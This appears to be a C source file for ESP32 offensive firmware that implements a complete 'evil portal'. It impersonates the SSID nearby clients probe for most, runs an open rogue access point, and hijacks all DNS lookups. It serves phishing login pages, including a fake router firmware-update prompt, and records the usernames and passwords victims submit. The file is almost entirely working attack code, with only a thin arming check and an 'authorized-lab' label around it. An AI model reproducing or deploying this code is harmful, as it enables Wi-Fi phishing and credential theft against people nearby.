// LxveOS evil-portal (see lxveos_evilportal.h). Rogue OPEN SoftAP + captive credential-capture portal.
// OFFENSIVE-TX: starting the AP is an emission, so start() refuses unless lxveos_arm_can_emit() is true.
// The Wi-Fi bring-up tolerates the stack already being up (the recon path lazily inits STA) — it adds an AP
// netif and switches to AP mode. A UDP:53 DNS-hijack responder resolves every lookup to the AP so client
// captive-portal detection auto-opens the login page; captured credentials are retained for `evilportal creds`.
#include "lxveos_evilportal.h"

#include <ctype.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>

#include "esp_event.h"
#include "esp_http_server.h"
#include "esp_log.h"
#include "esp_netif.h"
#include "esp_wifi.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "lwip/sockets.h"

#include "lxveos_arm.h"
#include "lxveos_formenc.h"
#include "lxveos_wifi.h"

static const char *TAG = "lxveos_evilportal";

static httpd_handle_t s_http;
static esp_netif_t   *s_ap_netif;
static uint32_t       s_captures;
static volatile bool  s_running;
static TaskHandle_t   s_dns_task;
static int            s_dns_sock = -1;

// Retain the most recent captures so the operator can read them back (`evilportal creds`) rather than
// scrolling the log. Ring buffer; both fields are sanitized + NUL-terminated.
#define EP_MAX_CREDS 16
typedef struct {
    char user[80];
    char pass[80];
} ep_cred_t;
static ep_cred_t s_creds[EP_MAX_CREDS];

// Generic, UNBRANDED captive-portal templates — each served for every request (captive-portal catch-all) and
// posts credentials to /login. They impersonate no specific brand; a brand-specific page for an authorized
// engagement is the operator's to add (drop HTML using the same username/password fields). The raw files
// live in templates/portals/ for the operator + the Cyber Controller template feature.
static const char HTML_NETLOGIN[] =
    "<!DOCTYPE html><html><head><meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<title>Network Login</title></head>"
    "<body style=\"font-family:sans-serif;max-width:360px;margin:40px auto\">"
    "<h2>Network sign-in required</h2><p>Please sign in to continue.</p>"
    "<form method=POST action=\"/login\">"
    "<p><input name=username placeholder=\"Username or email\" style=\"width:100%;padding:8px\"></p>"
    "<p><input name=password type=password placeholder=Password style=\"width:100%;padding:8px\"></p>"
    "<p><button type=submit style=\"width:100%;padding:10px\">Sign in</button></p>"
    "</form></body></html>";
static const char HTML_ROUTER[] =
    "<!DOCTYPE html><html><head><meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<title>Router Administration</title></head>"
    "<body style=\"font-family:sans-serif;max-width:380px;margin:40px auto\">"
    "<h2>Router Administration</h2><p>A firmware update is available. Sign in as administrator to apply it.</p>"
    "<form method=POST action=\"/login\">"
    "<p><input name=username placeholder=\"Administrator username\" style=\"width:100%;padding:8px\"></p>"
    "<p><input name=password type=password placeholder=\"Administrator password\" style=\"width:100%;padding:8px\"></p>"
    "<p><button type=submit style=\"width:100%;padding:10px\">Sign in</button></p>"
    "</form></body></html>";
static const char HTML_GUEST[] =
    "<!DOCTYPE html><html><head><meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<title>Guest Wi-Fi</title></head>"
    "<body style=\"font-family:sans-serif;max-width:360px;margin:40px auto\">"
    "<h2>Guest Wi-Fi access</h2><p>Enter your email and the access code from reception.</p>"
    "<form method=POST action=\"/login\">"
    "<p><input name=username type=email placeholder=\"Email address\" style=\"width:100%;padding:8px\"></p>"
    "<p><input name=password placeholder=\"Access code\" style=\"width:100%;padding:8px\"></p>"
    "<p><button type=submit style=\"width:100%;padding:10px\">Connect</button></p>"
    "</form></body></html>";
static const char HTML_REAUTH[] =
    "<!DOCTYPE html><html><head><meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<title>Session Expired</title></head>"
    "<body style=\"font-family:sans-serif;max-width:360px;margin:40px auto\">"
    "<h2>Your session has expired</h2><p>Please re-enter your credentials to continue.</p>"
    "<form method=POST action=\"/login\">"
    "<p><input name=username type=email placeholder=Email style=\"width:100%;padding:8px\"></p>"
    "<p><input name=password type=password placeholder=Password style=\"width:100%;padding:8px\"></p>"
    "<p><button type=submit style=\"width:100%;padding:10px\">Continue</button></p>"
    "</form></body></html>";

typedef struct {
    const char *id;
    const char *name;
    const char *html;
} ep_template_t;
static const ep_template_t TEMPLATES[] = {
    {"netlogin", "Network sign-in",       HTML_NETLOGIN},
    {"router",   "Router administration", HTML_ROUTER},
    {"guest",    "Guest Wi-Fi",           HTML_GUEST},
    {"reauth",   "Session expired",       HTML_REAUTH},
};
#define EP_TEMPLATE_N (sizeof(TEMPLATES) / sizeof(TEMPLATES[0]))
static size_t s_template;  // index into TEMPLATES; default 0 (netlogin)

static const char DONE_HTML[] =
    "<!DOCTYPE html><html><head><meta name=viewport content=\"width=device-width,initial-scale=1\"></head>"
    "<body style=\"font-family:sans-serif;max-width:360px;margin:40px auto\">"
    "<h2>Connecting&hellip;</h2><p>Please wait while your connection is established.</p></body></html>";

void lxveos_evilportal_creds_each(lxveos_evilportal_cred_cb cb)
{
    if (cb == NULL) {
        return;
    }
    size_t n = s_captures < EP_MAX_CREDS ? s_captures : EP_MAX_CREDS;
    size_t start = s_captures < EP_MAX_CREDS ? 0 : (s_captures % EP_MAX_CREDS);
    for (size_t i = 0; i < n; i++) {
        size_t idx = (start + i) % EP_MAX_CREDS;
        cb(s_creds[idx].user, s_creds[idx].pass);
    }
}

bool lxveos_evilportal_template_set(const char *id)
{
    for (size_t i = 0; i < EP_TEMPLATE_N; i++) {
        if (strcmp(TEMPLATES[i].id, id) == 0) {
            s_template = i;
            return true;
        }
    }
    return false;
}

void lxveos_evilportal_templates_each(lxveos_evilportal_tmpl_cb cb)
{
    if (cb == NULL) {
        return;
    }
    for (size_t i = 0; i < EP_TEMPLATE_N; i++) {
        cb(TEMPLATES[i].id, TEMPLATES[i].name, i == s_template);
    }
}

esp_err_t lxveos_evilportal_start_karma(char *chosen, size_t chosen_sz)
{
    if (s_running) {
        return ESP_ERR_INVALID_STATE;
    }
    if (!lxveos_arm_can_emit()) {
        return ESP_ERR_NOT_ALLOWED;
    }
    // Demand-driven lure: listen for the SSIDs nearby clients are actively probing for, then pick the single
    // most-requested real one and stand the portal up as that. One SSID, driven by observed client demand —
    // NOT a beacon-spam list. (Injection-based multi-SSID karma is the beacon-spam class and lives upstream.)
    static lxveos_wifi_probe_t pr[32];
    size_t found = 0;
    uint32_t total = 0, wildcard = 0;
    esp_err_t e = lxveos_wifi_probe_scan(10, 0, pr, sizeof(pr) / sizeof(pr[0]), &found, &total, &wildcard);
    if (e != ESP_OK) {
        return e;
    }
    const char *best = NULL;
    uint32_t best_count = 0;
    for (size_t i = 0; i < found; i++) {
        if (pr[i].ssid[0] != '\0' && pr[i].count > best_count) {
            best_count = pr[i].count;
            best = pr[i].ssid;
        }
    }
    if (best == NULL) {
        return ESP_ERR_NOT_FOUND;  // no directed probe requests seen — nothing to lure with
    }
    if (chosen != NULL && chosen_sz > 0) {
        lxveos_formenc_store_field(chosen, chosen_sz, best);
    }
    return lxveos_evilportal_start(best);
}

// Minimal DNS responder: answer every query with the AP IP (192.168.4.1) so a client's captive-portal
// detection resolves to us and auto-opens the login page. Built like the ESP-IDF captive-portal example;
// stop() calls shutdown() on the socket to break the blocking recvfrom so this task exits.
static void dns_task(void *arg)
{
    (void)arg;
    uint8_t buf[512];
    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(53);
    sa.sin_addr.s_addr = htonl(INADDR_ANY);
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0 || bind(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        if (sock >= 0) {
            close(sock);
        }
        s_dns_task = NULL;
        vTaskDelete(NULL);
        return;
    }
    s_dns_sock = sock;
    while (s_running) {
        struct sockaddr_in src;
        socklen_t sl = sizeof(src);
        int len = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr *)&src, &sl);
        if (len < 12) {
            if (len < 0) {
                break;  // socket shut down by stop()
            }
            continue;
        }
        buf[2] = 0x81;  // QR=1, opcode 0, RD copied
        buf[3] = 0x80;  // RA=1, RCODE=0
        buf[6] = 0x00;
        buf[7] = 0x01;  // ANCOUNT = 1
        buf[8] = buf[9] = buf[10] = buf[11] = 0x00;  // NSCOUNT / ARCOUNT = 0
        int qend = 12;
        while (qend < len && buf[qend] != 0) {
            qend += buf[qend] + 1;  // walk the QNAME labels
        }
        qend += 5;  // null label (1) + QTYPE (2) + QCLASS (2)
        if (qend > len || qend + 16 > (int)sizeof(buf)) {
            continue;  // malformed or no room for the answer
        }
        int p = qend;
        buf[p++] = 0xC0;
        buf[p++] = 0x0C;  // NAME: pointer to the question
        buf[p++] = 0x00;
        buf[p++] = 0x01;  // TYPE A
        buf[p++] = 0x00;
        buf[p++] = 0x01;  // CLASS IN
        buf[p++] = 0x00;
        buf[p++] = 0x00;
        buf[p++] = 0x00;
        buf[p++] = 0x3c;  // TTL 60s
        buf[p++] = 0x00;
        buf[p++] = 0x04;  // RDLENGTH 4
        buf[p++] = 192;
        buf[p++] = 168;
        buf[p++] = 4;
        buf[p++] = 1;  // RDATA: 192.168.4.1 (the AP gateway)
        sendto(sock, buf, p, 0, (struct sockaddr *)&src, sl);
    }
    close(sock);
    s_dns_sock = -1;
    s_dns_task = NULL;
    vTaskDelete(NULL);
}

// Any GET -> the selected login page (captive-portal catch-all via the wildcard match fn).
static esp_err_t portal_get_handler(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, TEMPLATES[s_template].html, HTTPD_RESP_USE_STRLEN);
}

// POST /login -> capture the submitted credentials (logged + counted), then show a benign "connecting" page.
static esp_err_t login_post_handler(httpd_req_t *req)
{
    char body[512];
    size_t total = req->content_len;
    if (total > sizeof(body) - 1) {
        total = sizeof(body) - 1;
    }
    size_t received = 0;
    while (received < total) {
        int r = httpd_req_recv(req, body + received, total - received);
        if (r <= 0) {
            if (r == HTTPD_SOCK_ERR_TIMEOUT) {
                continue;
            }
            return ESP_FAIL;
        }
        received += (size_t)r;
    }
    body[received] = '\0';

    char user[160] = {0};
    char pass[160] = {0};
    lxveos_formenc_form_field(body, "username", user, sizeof(user));
    lxveos_formenc_form_field(body, "password", pass, sizeof(pass));
    lxveos_formenc_sanitize(user);
    lxveos_formenc_sanitize(pass);
    s_captures++;
    size_t slot = (s_captures - 1) % EP_MAX_CREDS;
    lxveos_formenc_store_field(s_creds[slot].user, sizeof(s_creds[slot].user), user);
    lxveos_formenc_store_field(s_creds[slot].pass, sizeof(s_creds[slot].pass), pass);
    ESP_LOGW(TAG, "captured credential #%u: user='%s' pass='%s'", (unsigned)s_captures, user, pass);

    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, DONE_HTML, HTTPD_RESP_USE_STRLEN);
}

esp_err_t lxveos_evilportal_start(const char *ssid)
{
    if (s_running) {
        return ESP_ERR_INVALID_STATE;
    }
    if (!lxveos_arm_can_emit()) {
        return ESP_ERR_NOT_ALLOWED;  // not armed / offensive TX compiled out
    }
    if (ssid == NULL || ssid[0] == '\0') {
        return ESP_ERR_INVALID_ARG;
    }

    esp_netif_init();  // idempotent if the recon path already inited networking
    esp_err_t e = esp_event_loop_create_default();
    if (e != ESP_OK && e != ESP_ERR_INVALID_STATE) {
        return e;
    }
    if (s_ap_netif == NULL) {
        s_ap_netif = esp_netif_create_default_wifi_ap();
        if (s_ap_netif == NULL) {
            return ESP_FAIL;
        }
    }
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    e = esp_wifi_init(&cfg);
    if (e != ESP_OK && e != ESP_ERR_INVALID_STATE) {
        return e;
    }

    wifi_config_t ap = {0};
    size_t n = strlen(ssid);
    if (n > sizeof(ap.ap.ssid)) {
        n = sizeof(ap.ap.ssid);
    }
    memcpy(ap.ap.ssid, ssid, n);
    ap.ap.ssid_len = (uint8_t)n;
    ap.ap.channel = 1;
    ap.ap.max_connection = 4;
    ap.ap.authmode = WIFI_AUTH_OPEN;
    ap.ap.beacon_interval = 100;

    if ((e = esp_wifi_set_mode(WIFI_MODE_AP)) != ESP_OK) {
        return e;
    }
    if ((e = esp_wifi_set_config(WIFI_IF_AP, &ap)) != ESP_OK) {
        return e;
    }
    e = esp_wifi_start();
    if (e != ESP_OK && e != ESP_ERR_INVALID_STATE) {
        return e;
    }

    httpd_config_t hc = HTTPD_DEFAULT_CONFIG();
    hc.uri_match_fn = httpd_uri_match_wildcard;
    hc.lru_purge_enable = true;
    hc.max_uri_handlers = 8;
    if ((e = httpd_start(&s_http, &hc)) != ESP_OK) {
        s_http = NULL;
        return e;
    }
    httpd_uri_t login_uri = {
        .uri = "/login", .method = HTTP_POST, .handler = login_post_handler, .user_ctx = NULL};
    httpd_uri_t portal_uri = {
        .uri = "/*", .method = HTTP_GET, .handler = portal_get_handler, .user_ctx = NULL};
    httpd_register_uri_handler(s_http, &login_uri);
    httpd_register_uri_handler(s_http, &portal_uri);

    s_captures = 0;
    s_running = true;
    // Captive DNS responder: resolve every lookup to the AP so client portal-detection auto-opens the page.
    if (xTaskCreate(dns_task, "lxv_dns", 4096, NULL, 5, &s_dns_task) != pdPASS) {
        s_dns_task = NULL;  // the portal still works at the gateway; only the auto-pop is lost
        ESP_LOGW(TAG, "DNS responder failed to start — captive auto-pop disabled");
    }
    ESP_LOGW(TAG, "evil-portal up: OPEN AP '%s' (ch1), captive login at 192.168.4.1 — authorized-lab test",
             ssid);
    return ESP_OK;
}

esp_err_t lxveos_evilportal_stop(void)
{
    bool was_running = s_running;
    s_running = false;
    if (s_dns_sock >= 0) {
        shutdown(s_dns_sock, SHUT_RDWR);  // unblock the DNS task's recvfrom; the task closes the socket
    }
    if (s_http != NULL) {
        httpd_stop(s_http);
        s_http = NULL;
    }
    if (was_running) {
        esp_wifi_stop();
        ESP_LOGW(TAG, "evil-portal stopped (%u credential(s) captured)", (unsigned)s_captures);
    }
    return ESP_OK;
}

bool lxveos_evilportal_running(void)
{
    return s_running;
}

uint32_t lxveos_evilportal_captures(void)
{
    return s_captures;
}
